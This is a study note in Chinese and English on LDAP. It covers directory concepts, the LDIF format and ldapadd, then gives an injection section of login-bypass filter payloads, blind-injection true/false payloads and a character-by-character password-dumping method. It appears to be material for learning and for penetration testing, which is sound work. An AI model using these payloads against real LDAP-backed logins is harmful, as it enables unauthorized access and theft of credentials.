# LDAP
## 基础知识
**概念**
lightly directory access protocol 轻量级目录访问协议，基于TCP/IP协议，通过在网络上的目录服务器上的存储和检索信息实现用户身份验证和访问控制目录查询等功能
**默认端口**
默认端口是389，使用SSL/TSL加密通信时，使用636端口
**关键字**
dc domain component 域名组成部分
例如：域名`example.com     dc=example,dc=comu`
uid user id 用户id
ou orgnization unit 组织单位
cn common name 公共名
sn surname 姓
dn distinguished name 一条记录的位置 “uid=a,ou=oa,dc=aa,dc=com”
rdn rlative dn 相对dn 类似相对路径
## 增删改查
### 文件格式
数据都存储在.ldif文件中
基本结构：
注释行：以井号（#）开头的行，用于添加注释信息，不会被LDAP服务器处理。

DN行：以dn:开头，后跟目录项的Distinguished Name（唯一标识符），用于指定目录项的位置。

属性行：以属性名:属性值的形式表示，用于描述目录项的属性和属性值。
```
# 添加一个新的用户
dn: cn=John Doe,ou=users,dc=example,dc=com
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
cn: John Doe
sn: Doe
givenName: John
mail: john.doe@example.com
userPassword: {SHA}nFCebWjxfaLbHHG1Qk5UU4trbvQ=

# 修改用户密码
dn: cn=John Doe,ou=users,dc=example,dc=com
changetype: modify
replace: userPassword
userPassword: {SHA}5en6G6MezRroT3XKqkdPOmY/BfQ=

# 删除一个用户
dn: cn=John Doe,ou=users,dc=example,dc=com
changetype: delete

```

### 命令格式
```<command> [ldap server ip] [username] [passwd] [ldap file addr]```
 ldapadd 添加文件
```
ldapadd -x -H ldap://127.0.0.1:389 -b "cn=admin,dc=example,dc=com" -w admin -f demo.ldif
``` 
## 注入漏洞
### Login Bypass
LDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed.
```
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi

user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))

user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))

user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed

user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error

username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.

username=*
password=*)(&
--> (&(user=*)(password=*)(&))

username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
### Blind LDAP Injection
You may force False or True responses to check if any data is returned and confirm a possible Blind LDAP Injection:
```
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))

#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### Dump data
You can iterate over the ascii letters, digits and symbols:
```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```